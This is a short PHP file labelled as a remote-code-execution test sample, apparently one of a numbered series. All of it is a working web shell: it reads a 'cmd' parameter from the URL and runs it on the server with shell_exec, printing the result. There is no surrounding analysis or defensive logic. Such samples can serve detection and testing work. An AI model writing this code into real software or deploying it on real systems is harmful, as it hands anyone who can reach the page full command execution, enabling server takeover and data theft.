<?php
// RCE test variation #264
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>